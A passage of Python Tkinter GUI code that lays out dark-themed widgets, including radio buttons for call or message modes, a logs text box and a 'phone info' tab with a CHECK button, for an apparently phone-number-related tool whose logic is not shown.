	 activeforeground = '#141414',
	 activebackground = '#141414')

methodCallAndMessage = tk.Radiobutton(f2,text="All",
	variable = var,
	 value=1,
	 bg = '#141414',
	 font = 2,
	 fg = '#dbbb18',
	 activeforeground = '#141414',
	 activebackground = '#141414')


methodOnlyMessage = tk.Radiobutton(f2,text="Only Message",
	variable = var,
	 value=2,
	 bg = '#141414',
	 font = 2,
	 fg = '#dbbb18',
	 activeforeground = '#141414',
	 activebackground = '#141414')

f3 = tk.Frame(nb)
nb.add(f3, text = 'logs')
f3['bg'] = "#141414"

logs = tk.Text(f3,
	fg = '#fc12d5',
	bg = "#0d0d0d",
	height = 21,
	width = 36,
	wrap = 'word',
	font = 15 )


f4 = tk.Frame(nb)
nb.add(f4, text = 'phone info')
f4['bg'] = "#141414"

mystring4 = tk.StringVar(root)
phoneforcheck = mystring4.get()

phoneforcheckentry = Entry(f4,
	textvariable = mystring4,
	width=35,
	fg='#8ed41e',
	bd=5,
	bg='#383738',
	font = 15,
	justify = 'center')

butforcheck = Button(f4,
				text = 'CHECK',
				font = ("Segoe Script", "13"),
				fg='#fa2ae5', 
				bg='#5c0c54',
				height = 2,
				width = 10,
				command = showinfophonecheck)

phoneforcheckentry.pack()
butforcheck.pack()


text1.pack()
text1.place(x = 0, y = 0)
e1.pack()
e1.place(x = 0, y = 30)
button1.pack()
button1.place(x = 0, y = 75)
stop.pack()
stop.place(x = 270, y = 75)
logs.pack()
logs.place(x = 0, y = 0)
Text2.pack()
Text2.place(x = 0, y = 40 )
methodOnlyCall.pack()
methodOnlyCall.place(x = 0, y = 60)
methodCallAndMessage.pack()
methodCallAndMessage.place(x = 0, y = 100)
methodOnlyMessage.pack()
methodOnlyMessage.place(x = 0, y = 140)
 












root.mainloop()


